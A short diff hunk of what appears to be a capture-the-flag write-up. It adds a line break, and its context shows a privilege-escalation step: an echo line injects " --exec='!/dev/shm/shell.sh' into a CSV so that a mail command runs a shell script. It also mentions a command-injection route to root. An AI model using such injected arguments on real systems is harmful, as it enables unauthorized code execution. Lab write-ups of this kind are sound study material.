@@ -301,6 +301,8 @@ echo \" --exec=\'\!/dev/shm/shell.sh\' >> /var/www/private/leave_requests.csv
 
 For some reason pspy doesn't show some quotes, so we need to start with ". The original command is `mail -s "Leave Request: "$name christine`
 
+<br>
+
 #### Extra
 You suppose to get root by creating a new product in the machine with command injection inside it and doing a request with it.
 
